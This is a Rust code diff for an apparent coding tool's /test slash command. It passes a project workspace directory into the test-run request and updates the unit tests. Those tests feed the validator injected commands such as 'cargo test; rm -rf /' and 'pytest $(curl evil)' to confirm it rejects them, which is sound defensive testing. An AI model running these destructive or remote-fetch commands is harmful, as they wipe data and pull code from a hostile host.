@@ -31,6 +31,7 @@ pub(crate) fn parse_test_slash_args(raw: &str) -> (String, String) {
 fn build_test_request(
     scope: &str,
     args: &str,
+    workdir: std::path::PathBuf,
 ) -> Result<crate::test_runner::TestRunRequest, String> {
     use crate::test_runner::TestScope;
     use std::path::PathBuf;
@@ -72,9 +73,6 @@ fn build_test_request(
         other => return Err(format!("unknown scope '{other}'")),
     };
 
-    let workdir = std::env::current_dir() // compat-mode slash command uses the process workspace
-        .map_err(|e| format!("cannot determine workspace root: {e}"))?;
-
     Ok(crate::test_runner::TestRunRequest {
         scope: test_scope,
         workdir,
@@ -91,18 +89,20 @@ fn build_test_request(
 /// Start a supervised test run from the /test slash command.
 pub(crate) fn start_test_run(app: &mut App, scope: String, args: String) {
     let tx = app.tui_cmd_tx.clone();
-    let request_id = app.dialog_state.test_run_request.begin();
-    let session_id = app
-        .session_state
-        .session
-        .as_ref()
-        .map(|session| session.id.clone());
+    let (session_id, workdir) = match app.project_execution_context() {
+        Ok(context) => (context.session_id, context.workspace_root),
+        Err(error) => {
+            app.messages_state.toasts.error(&error);
+            return;
+        }
+    };
     let Some(core_client) = app.core_client.clone() else {
         app.messages_state
             .toasts
             .error("Core client unavailable; tests require the daemon scheduler");
         return;
     };
+    let request_id = app.dialog_state.test_run_request.begin();
 
     spawn_registered_tui_task(
         tx,
@@ -110,7 +110,7 @@ pub(crate) fn start_test_run(app: &mut App, scope: String, args: String) {
         TuiTaskKind::Command,
         "test_run",
         async move {
-            let request = match build_test_request(&scope, &args) {
+            let request = match build_test_request(&scope, &args, workdir) {
                 Ok(r) => r,
                 Err(e) => {
                     return Some(TuiCommand::TestRunFinished {
@@ -409,34 +409,35 @@ mod tests {
     #[test]
     fn tui_test_custom_rejects_semicolon_suffix() {
         // Bypass regression: TUI /test custom must use the strict validator.
-        assert!(build_test_request("custom", "cargo test; rm -rf /").is_err());
+        assert!(build_test_request("custom", "cargo test; rm -rf /", "/tmp".into()).is_err());
     }
 
     #[test]
     fn tui_test_custom_rejects_newline_suffix() {
-        assert!(build_test_request("custom", "cargo test\nrm -rf /").is_err());
+        assert!(build_test_request("custom", "cargo test\nrm -rf /", "/tmp".into()).is_err());
     }
 
     #[test]
     fn tui_test_custom_rejects_pipe_suffix() {
-        assert!(build_test_request("custom", "pytest | tee /tmp/out").is_err());
+        assert!(build_test_request("custom", "pytest | tee /tmp/out", "/tmp".into()).is_err());
     }
 
     #[test]
     fn tui_test_custom_rejects_command_substitution() {
-        assert!(build_test_request("custom", "pytest $(curl evil)").is_err());
-        assert!(build_test_request("custom", "cargo test `curl evil`").is_err());
+        assert!(build_test_request("custom", "pytest $(curl evil)", "/tmp".into()).is_err());
+        assert!(build_test_request("custom", "cargo test `curl evil`", "/tmp".into()).is_err());
     }
 
     #[test]
     fn tui_test_custom_rejects_prefix_collision() {
-        assert!(build_test_request("custom", "pytestevil").is_err());
-        assert!(build_test_request("custom", "cargo testify").is_err());
+        assert!(build_test_request("custom", "pytestevil", "/tmp".into()).is_err());
+        assert!(build_test_request("custom", "cargo testify", "/tmp".into()).is_err());
     }
 
     #[test]
     fn tui_test_custom_accepts_normal_pytest_args() {
-        let req = build_test_request("custom", "pytest -q tests/test_foo.py").unwrap();
+        let req =
+            build_test_request("custom", "pytest -q tests/test_foo.py", "/tmp".into()).unwrap();
         assert!(matches!(
             req.scope,
             crate::test_runner::TestScope::CustomCommand(_)
@@ -445,7 +446,8 @@ mod tests {
 
     #[test]
     fn tui_test_custom_accepts_normal_cargo_test_args() {
-        let req = build_test_request("custom", "cargo test --lib -p codegg-core").unwrap();
+        let req =
+            build_test_request("custom", "cargo test --lib -p codegg-core", "/tmp".into()).unwrap();
         assert!(matches!(
             req.scope,
             crate::test_runner::TestScope::CustomCommand(_)
